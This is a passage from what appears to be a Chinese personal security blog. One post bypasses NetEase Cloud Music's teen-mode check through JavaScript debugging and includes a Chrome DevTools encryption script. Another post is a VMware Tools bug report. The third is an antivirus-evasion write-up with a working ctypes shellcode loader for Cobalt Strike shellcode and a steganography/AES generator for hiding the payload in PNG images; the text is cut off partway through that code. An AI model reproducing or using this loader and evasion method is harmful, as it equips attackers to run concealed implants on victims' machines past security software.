<li>当流程走到这里的时候，已经完成一半了。直接F8，继续执行脚本，把代码全部放走。不出意外的话，就会停在刚刚下的<code>return m.isMobile</code>这个断点处了。这里是有第二个判断的。看右边堆栈，点击<code>checkAvailable()</code>函数，在<code>S.a &amp;&amp; (w.a.isMobile() &amp;&amp; F || a.redirect())</code>这一行打上断点。随后F8。重新来一次。</li>
</ol>
<p><img src="image-20231218235156132.png" alt="image-20231218235156132"></p>
<ol start="5">
<li>第二次点击点击关闭青少年模式按钮，前面的照常设置，直到流程来到<code>checkAvailable()</code>函数内，停在<code>S.a &amp;&amp; (w.a.isMobile() &amp;&amp; F || a.redirect())</code>这一行时，console输入F = true即可。现在就可以自由输入密码了。（在<code>r.asrsea)(JSON.stringify(v), (0,</code>打上断点）也可以得到数据明文了。</li>
</ol>
<p><img src="image-20231219000823145.png" alt="image-20231219000823145"></p>
<p>妈个鸡简单得很，密码口算了一下，是md5加密。{“userId”:”5xxxx7”,”password”:”81dc9bdb52d04dc20036dbd8313ed055”}</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>找到了明文，就可以开始写CDP加密脚本了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:This_is_Y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,Response,request</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> Req</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;https://music.163.com/&quot;</span></span><br><span class="line">callFrameId = <span class="string">&#x27;&#123;&quot;ordinal&quot;:0,&quot;injectedScriptId&quot;:1&#125;&#x27;</span></span><br><span class="line">level = logging.DEBUG</span><br><span class="line">logging.basicConfig(level=level)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendCDP</span>(<span class="params">js_code</span>):</span></span><br><span class="line">    ws_res = Req.get(url = <span class="string">&quot;http://127.0.0.1:9222/json&quot;</span>)</span><br><span class="line">    ws_res_json = json.loads(ws_res.content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ws_res_json:</span><br><span class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> i[<span class="string">&#x27;url&#x27;</span>]:</span><br><span class="line">            <span class="comment"># logging.info(&quot;webSocketDebuggerUrl&gt;&gt;&gt;&quot;+i[&#x27;webSocketDebuggerUrl&#x27;])</span></span><br><span class="line">            <span class="comment"># print(&quot;webSocketDebuggerUrl&gt;&gt;&gt;&quot;,i[&#x27;webSocketDebuggerUrl&#x27;])</span></span><br><span class="line">            ws_url = i[<span class="string">&#x27;webSocketDebuggerUrl&#x27;</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn = websocket.create_connection(ws_url,header=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;this_is_y&quot;</span>&#125;)</span><br><span class="line">    request_id = <span class="built_in">int</span>(random.random()*<span class="number">10000</span>)</span><br><span class="line">    method = <span class="string">&quot;Debugger.evaluateOnCallFrame&quot;</span></span><br><span class="line">    param = &#123;<span class="string">&quot;callFrameId&quot;</span>:callFrameId,<span class="string">&quot;expression&quot;</span>:js_code,<span class="string">&quot;generatePreview&quot;</span>:<span class="literal">True</span>,<span class="string">&quot;includeCommandLineAPI&quot;</span>:<span class="literal">True</span>,<span class="string">&quot;silent&quot;</span>:<span class="literal">False</span>,<span class="string">&quot;returnByValue&quot;</span>:<span class="literal">True</span>&#125;</span><br><span class="line">    command  = &#123;<span class="string">&#x27;method&#x27;</span>: method,</span><br><span class="line">               <span class="string">&#x27;id&#x27;</span>: request_id,</span><br><span class="line">               <span class="string">&#x27;params&#x27;</span>: param&#125;</span><br><span class="line">    request_id+=<span class="number">1</span></span><br><span class="line">    logging.info(<span class="string">&quot;sendCDP-payload&gt;&gt;&gt; &quot;</span>+<span class="built_in">str</span>(command)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    conn.send(json.dumps(command))</span><br><span class="line">    <span class="comment"># 接受websocket的响应，并将字符串转换为 dict()</span></span><br><span class="line">    result = json.loads(conn.recv())</span><br><span class="line">    <span class="comment"># print(&quot;&gt;result:&quot;,result)</span></span><br><span class="line">    logging.info(<span class="string">&quot;sendCDP-result&gt;&gt;&gt;&gt; &quot;</span>+<span class="built_in">str</span>(result)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asrsea</span>(<span class="params">params</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    构造CDP请求,发送，并解析返回结果,</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    js_code = <span class="string">&quot;&quot;&quot;(0,r.asrsea)(&#x27;&#123;&#125;&#x27;, (0,r.emj2code)([&quot;流泪&quot;, &quot;强&quot;]), r.BASE_CODE, (0,r.emj2code)([&quot;爱心&quot;, &quot;女孩&quot;, &quot;惊恐&quot;, &quot;大笑&quot;]))&quot;&quot;&quot;</span>.<span class="built_in">format</span>(params)</span><br><span class="line">    logging.info(<span class="string">&quot;mydecrypt_js_code&gt;&gt;&gt;&quot;</span>+js_code+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sendCDP(js_code)[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/encode&#x27;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==============/encode==================&quot;</span>)</span><br><span class="line">    dataHeaders = request.form.get(<span class="string">&quot;dataHeaders&quot;</span>)   <span class="comment"># 获取 headers </span></span><br><span class="line">    dataBody = request.form.get(<span class="string">&#x27;dataBody&#x27;</span>).replace(<span class="string">&quot;\r\n&quot;</span>,<span class="string">&quot;&quot;</span>)  <span class="comment"># 获取 body 参数</span></span><br><span class="line">    logging.info(<span class="string">&quot;dataHeaders&gt;&gt;&quot;</span>+dataHeaders)</span><br><span class="line">    logging.info(<span class="string">&quot;dataBody&gt;&gt;&quot;</span>+dataBody)</span><br><span class="line">    requestbody = dataBody</span><br><span class="line">    data = asrsea(requestbody)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) != <span class="built_in">dict</span>:</span><br><span class="line">        logging.error(<span class="string">&quot;data error&quot;</span>)</span><br><span class="line">    params = urllib.parse.urlencode(data).replace(<span class="string">&quot;encText&quot;</span>,<span class="string">&quot;params&quot;</span>)</span><br><span class="line">    logging.info(<span class="string">&quot;params&quot;</span>+params)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dataHeaders+<span class="string">&quot;\r\n\r\n\r\n&quot;</span>+params</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    app.debug = <span class="literal">True</span> <span class="comment"># 设置调试模式，生产模式的时候要关掉debug</span></span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="string">&quot;8890&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以我密码应该是2315？（反正密码现在确实已经解开了）</p>
<p><img src="image-20231219005801122.png" alt="image-20231219005801122"></p>
<p><img src="7a66b2837f34f29028e7466300e6e5da_720.jpg" alt="7a66b2837f34f29028e7466300e6e5da_720"></p>
<p><img src="d6f6e6592f5485f709f053a9af0f1d29_720.jpg" alt="d6f6e6592f5485f709f053a9af0f1d29_720"></p>
<h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>网易云这个前端js的加解密，有点意思。</p>
<ol>
<li><p>首先是加密函数的命名，asrsea。其实就是 aes rsa 倒过来。</p>
</li>
<li><p>关于一些变量，比如rsa公钥，不是直接什么publickey = xxxxx。他这里用了一个字符串替换，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> E = (<span class="number">0</span>,</span><br><span class="line">r.asrsea)(<span class="built_in">JSON</span>.stringify(v), (<span class="number">0</span>,</span><br><span class="line">r.emj2code)([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), r.BASE_CODE, (<span class="number">0</span>,</span><br><span class="line">r.emj2code)([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br><span class="line">简化一下</span><br><span class="line"><span class="keyword">var</span> E = (<span class="number">0</span>,r.asrsea)(<span class="built_in">JSON</span>.stringify(v), (<span class="number">0</span>,r.emj2code)([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), r.BASE_CODE, (<span class="number">0</span>,r.emj2code)([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br></pre></td></tr></table></figure>

<p>比如这里。asrsea函数闯入了四个值，只有第一个是需要处理的明文，后面三个都是固定值，写死了的。其中第二个和第四个，(0,r.emj2code)([“流泪”, “强”])可以在main.js里搜索一下。这里实际上都对应了字符串，如下图</p>
</li>
</ol>
<p><img src="image-20231219001604342.png" alt="image-20231219001604342"></p>
<ol start="3">
<li>因为关闭青少年模式的接口（/weapi/user/setting/teenpattern/close）不需要cookie，本来以为这几个接口能未授权，结果拿到open的数据包后，发现开启青少年模式居然又要cookie。绝了，肯定是以前被人挖过了</li>
</ol>
<p><img src="image-20231220131447600.png" alt="image-20231220131447600"></p>
<p><img src="image-20231220131512479.png" alt="image-20231220131512479"></p>
]]></content>
  </entry>
  <entry>
    <title>记录一个BUG</title>
    <url>/2020/02/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AABUG-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12349239.html">源地址：https://www.cnblogs.com/This-is-Y/p/12349239.html<i class="fas fa-external-link-alt"></i></a></p>
<p>vm版本：</p>
<img src="1503868-20200223122927267-1759203332.png" alt>

<p> </p>
<p> kali版本：</p>
<img src="1503868-20200223123033550-882413071.png" alt>

<p> </p>
<p> centos 8 版本：</p>
<img src="1503868-20200223123115941-1001356668.png" alt>

<p> </p>
<p> VMtool版本：</p>
<img src="1503868-20200223123217181-1548008753.png" alt>

<p> </p>
<p> </p>
<p> 新装的centOS8 因为无法拖拽文件到虚拟机中，就重新装了一下VMtool，安装之后还是不行，打开kali发现原本装好的vmtool，现在也不能拖拽文件了，就又在kali重装了一次，还是不能拖拽，<a class="link" href="https://www.cnblogs.com/BonnieWss/p/11382929.html">上网查了一下<i class="fas fa-external-link-alt"></i></a>，在运行./vmware-user文件后，可以正常拖拽（无需重启）。想到在centos中是不是也是一样的原因，回到centos，用一样的方法，在运行./vmware-user后，弹出这个</p>
<img src="1503868-20200223123900961-55328361.png" alt>

<p> </p>
<p>可以在下面输入ls等命令，但是不管是什么，只能运行一次命令，之后就退出</p>
<p> <img src="1503868-20200223124015506-1031670600.png" alt></p>
<p> </p>
<p> <img src="1503868-20200223124112051-220060555.png" alt></p>
<p>小白一枚，有任何想法都愿意洗耳恭听。</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>记录一个免杀思路</title>
    <url>/2023/06/13/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%AA%E6%96%B0(%E6%97%A7)%E7%9A%84%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h1><p>AST抽象语法树+图片隐写</p>
<p>思路以及部分代码来源<br><a class="link" href="https://github.com/RobinDavid/LSB-Steganography">https://github.com/RobinDavid/LSB-Steganography<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://unsafe.sh/go-167427.html">https://unsafe.sh/go-167427.html<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>选择的是CS4.7 的python shellcode，忘了是32还是64了，<del>无关紧要</del>。</p>
<h1 id="执行代码模板"><a href="#执行代码模板" class="headerlink" title="执行代码模板"></a>执行代码模板</h1><p>手动把生成的shellcode替换到buf参数中，前面的 <strong>b</strong> 不要删了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># code</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_int,c_uint64,windll,c_char,pointer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">py3loader2</span>(<span class="params">para</span>):</span></span><br><span class="line">        para = <span class="built_in">bytearray</span>(para)</span><br><span class="line">        windll.kernel32.VirtualAlloc.restype = c_uint64</span><br><span class="line">        ptr = windll.kernel32.VirtualAlloc(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="built_in">len</span>(para)),</span><br><span class="line">                c_int(<span class="number">0x3000</span>),</span><br><span class="line">                c_int(<span class="number">0x40</span>)</span><br><span class="line">        )</span><br><span class="line">        buf = (c_char * <span class="built_in">len</span>(para)).from_buffer(para)</span><br><span class="line">        windll.kernel32.RtlMoveMemory(</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                buf,</span><br><span class="line">                c_int(<span class="built_in">len</span>(para))</span><br><span class="line">        )</span><br><span class="line">        handle = windll.kernel32.CreateThread(</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_uint64(ptr),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                c_int(<span class="number">0</span>),</span><br><span class="line">                pointer(c_int(<span class="number">0</span>))</span><br><span class="line">        )</span><br><span class="line">        windll.kernel32.WaitForSingleObject(</span><br><span class="line">                c_int(handle),</span><br><span class="line">                c_int(-<span class="number">1</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00\x48\x8d\x1d\xea\xff\xff\xff\x48\x89\xdf\x48\x81\xc3\x3c\x6e\x01\x00\xff\xd3\x41\xb8\xf0\xb5\xa2\x56\x68\x04\x00\x00\x00\x5a\x48\x89\xf9\xff\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x01\x00\x00\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21\x54\x68\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a\x24\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">py3loader2(buf)</span><br></pre></td></tr></table></figure>



<h1 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h1><p>负责生成隐写的图片和aes加密后的代码（这部分没什么用）。被隐写的图片只能用png类型，而且还不能太小，需要有一定的冗余空间。几kb那种肯定不行的，具体多少我也没测试，随手截了一张壁纸。</p>
<p>其中用到了aes加密，需要自己设置好key和iv，启动的时候需要用的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># generate.py</span></span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> docopt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SteganographyException</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LSBSteg</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, im</span>):</span></span><br><span class="line">        self.image = im</span><br><span class="line">        self.height, self.width, self.nbchannels = im.shape</span><br><span class="line">        self.size = self.width * self.height</span><br><span class="line">        </span><br><span class="line">        self.maskONEValues = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">64</span>,<span class="number">128</span>]</span><br><span class="line">        <span class="comment">#Mask used to put one ex:1-&gt;00000001, 2-&gt;00000010 .. associated with OR bitwise</span></span><br><span class="line">        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>) <span class="comment">#Will be used to do bitwise operations</span></span><br><span class="line">        </span><br><span class="line">        self.maskZEROValues = [<span class="number">254</span>,<span class="number">253</span>,<span class="number">251</span>,<span class="number">247</span>,<span class="number">239</span>,<span class="number">223</span>,<span class="number">191</span>,<span class="number">127</span>]</span><br><span class="line">        <span class="comment">#Mak used to put zero ex:254-&gt;11111110, 253-&gt;11111101 .. associated with AND bitwise</span></span><br><span class="line">        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        self.curwidth = <span class="number">0</span>  <span class="comment"># Current width position</span></span><br><span class="line">        self.curheight = <span class="number">0</span> <span class="comment"># Current height position</span></span><br><span class="line">        self.curchan = <span class="number">0</span>   <span class="comment"># Current channel position</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put_binary_value</span>(<span class="params">self, bits</span>):</span> <span class="comment">#Put the bits in the image</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> bits:</span><br><span class="line">            val = <span class="built_in">list</span>(self.image[self.curheight,self.curwidth]) <span class="comment">#Get the pixel value as a list</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(c) == <span class="number">1</span>:</span><br><span class="line">                val[self.curchan] = <span class="built_in">int</span>(val[self.curchan]) | self.maskONE <span class="comment">#OR with maskONE</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                val[self.curchan] = <span class="built_in">int</span>(val[self.curchan]) &amp; self.maskZERO <span class="comment">#AND with maskZERO</span></span><br><span class="line">                </span><br><span class="line">            self.image[self.curheight,self.curwidth] = <span class="built_in">tuple</span>(val)</span><br><span class="line">            self.next_slot() <span class="comment">#Move &quot;cursor&quot; to the next space</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_slot</span>(<span class="params">self</span>):</span><span class="comment">#Move to the next slot were information can be taken or put</span></span><br><span class="line">        <span class="keyword">if</span> self.curchan == self.nbchannels-<span class="number">1</span>: <span class="comment">#Next Space is the following channel</span></span><br><span class="line">            self.curchan = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> self.curwidth == self.width-<span class="number">1</span>: <span class="comment">#Or the first channel of the next pixel of the same line</span></span><br><span class="line">                self.curwidth = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> self.curheight == self.height-<span class="number">1</span>:<span class="comment">#Or the first channel of the first pixel of the next line</span></span><br><span class="line">                    self.curheight = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">if</span> self.maskONE == <span class="number">128</span>: <span class="comment">#Mask 1000000, so the last mask</span></span><br><span class="line">                        <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;No available slot remaining (image filled)&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>: <span class="comment">#Or instead of using the first bit start using the second and so on..</span></span><br><span class="line">                        self.maskONE = self.maskONEValues.pop(<span class="number">0</span>)</span><br><span class="line">                        self.maskZERO = self.maskZEROValues.pop(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.curheight +=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.curwidth +=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.curchan +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bit</span>(<span class="params">self</span>):</span> <span class="comment">#Read a single bit int the image</span></span><br><span class="line">        val = self.image[self.curheight,self.curwidth][self.curchan]</span><br><span class="line">        val = <span class="built_in">int</span>(val) &amp; self.maskONE</span><br><span class="line">        self.next_slot()</span><br><span class="line">        <span class="keyword">if</span> val &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_byte</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.read_bits(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read_bits</span>(<span class="params">self, nb</span>):</span> <span class="comment">#Read the given number of bits</span></span><br><span class="line">        bits = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nb):</span><br><span class="line">            bits += self.read_bit()</span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">byteValue</span>(<span class="params">self, val</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.binary_value(val, <span class="number">8</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">binary_value</span>(<span class="params">self, val, bitsize</span>):</span> <span class="comment">#Return the binary value of an int as a byte</span></span><br><span class="line">        binval = <span class="built_in">bin</span>(val)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(binval) &gt; bitsize:</span><br><span class="line">            <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;binary value larger than the expected size&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(binval) &lt; bitsize:</span><br><span class="line">            binval = <span class="string">&quot;0&quot;</span>+binval</span><br><span class="line">        <span class="keyword">return</span> binval</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_text</span>(<span class="params">self, txt</span>):</span></span><br><span class="line">        l = <span class="built_in">len</span>(txt)</span><br><span class="line">        binl = self.binary_value(l, <span class="number">16</span>) <span class="comment">#Length coded on 2 bytes so the text size can be up to 65536 bytes long</span></span><br><span class="line">        self.put_binary_value(binl) <span class="comment">#Put text length coded on 4 bytes</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> txt: <span class="comment">#And put all the chars</span></span><br><span class="line">            c = <span class="built_in">ord</span>(char)</span><br><span class="line">            self.put_binary_value(self.byteValue(c))</span><br><span class="line">        <span class="keyword">return</span> self.image</span><br><span class="line">       </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_text</span>(<span class="params">self</span>):</span></span><br><span class="line">        ls = self.read_bits(<span class="number">16</span>) <span class="comment">#Read the text size in bytes</span></span><br><span class="line">        l = <span class="built_in">int</span>(ls,<span class="number">2</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        unhideTxt = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; l: <span class="comment">#Read all bytes of the text</span></span><br><span class="line">            tmp = self.read_byte() <span class="comment">#So one byte</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            unhideTxt += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmp,<span class="number">2</span>)) <span class="comment">#Every chars concatenated to str</span></span><br><span class="line">        <span class="keyword">return</span> unhideTxt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_image</span>(<span class="params">self, imtohide</span>):</span></span><br><span class="line">        w = imtohide.width</span><br><span class="line">        h = imtohide.height</span><br><span class="line">        <span class="keyword">if</span> self.width*self.height*self.nbchannels &lt; w*h*imtohide.channels:</span><br><span class="line">            <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;Carrier image not big enough to hold all the datas to steganography&quot;</span>)</span><br><span class="line">        binw = self.binary_value(w, <span class="number">16</span>) <span class="comment">#Width coded on to byte so width up to 65536</span></span><br><span class="line">        binh = self.binary_value(h, <span class="number">16</span>)</span><br><span class="line">        self.put_binary_value(binw) <span class="comment">#Put width</span></span><br><span class="line">        self.put_binary_value(binh) <span class="comment">#Put height</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(imtohide.height): <span class="comment">#Iterate the hole image to put every pixel values</span></span><br><span class="line">            <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(imtohide.width):</span><br><span class="line">                <span class="keyword">for</span> chan <span class="keyword">in</span> <span class="built_in">range</span>(imtohide.channels):</span><br><span class="line">                    val = imtohide[h,w][chan]</span><br><span class="line">                    self.put_binary_value(self.byteValue(<span class="built_in">int</span>(val)))</span><br><span class="line">        <span class="keyword">return</span> self.image</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_image</span>(<span class="params">self</span>):</span></span><br><span class="line">        width = <span class="built_in">int</span>(self.read_bits(<span class="number">16</span>),<span class="number">2</span>) <span class="comment">#Read 16bits and convert it in int</span></span><br><span class="line">        height = <span class="built_in">int</span>(self.read_bits(<span class="number">16</span>),<span class="number">2</span>)</span><br><span class="line">        unhideimg = np.zeros((width,height, <span class="number">3</span>), np.uint8) <span class="comment">#Create an image in which we will put all the pixels read</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                <span class="keyword">for</span> chan <span class="keyword">in</span> <span class="built_in">range</span>(unhideimg.channels):</span><br><span class="line">                    val = <span class="built_in">list</span>(unhideimg[h,w])</span><br><span class="line">                    val[chan] = <span class="built_in">int</span>(self.read_byte(),<span class="number">2</span>) <span class="comment">#Read the value</span></span><br><span class="line">                    unhideimg[h,w] = <span class="built_in">tuple</span>(val)</span><br><span class="line">        <span class="keyword">return</span> unhideimg</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode_binary</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        l = <span class="built_in">len</span>(data)</span><br><span class="line">        <span class="keyword">if</span> self.width*self.height*self.nbchannels &lt; l+<span class="number">64</span>:</span><br><span class="line">            <span class="keyword">raise</span> SteganographyException(<span class="string">&quot;Carrier image not big enough to hold all the datas to steganography&quot;</span>)</span><br><span class="line">        self.put_binary_value(self.binary_value(l, <span class="number">64</span>))</span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">            byte = byte <span class="keyword">if</span> <span class="built_in">isinstance</span>(byte, <span class="built_in">int</span>) <span class="keyword">else</span> <span class="built_in">ord</span>(byte) <span class="comment"># Compat py2/py3</span></span><br><span class="line">            self.put_binary_value(self.byteValue(byte))</span><br><span class="line">        <span class="keyword">return</span> self.image</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_binary</span>(<span class="params">self</span>):</span></span><br><span class="line">        l = <span class="built_in">int</span>(self.read_bits(<span class="number">64</span>), <span class="number">2</span>)</span><br><span class="line">        output = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            output += <span class="built_in">bytearray</span>([<span class="built_in">int</span>(self.read_byte(),<span class="number">2</span>)])</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_shellcode</span>(<span class="params">payload,key,iv</span>):</span></span><br><span class="line">    <span class="comment"># 读取shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(payload,<span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        shellcode = f.read()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The file length is &quot;</span>,<span 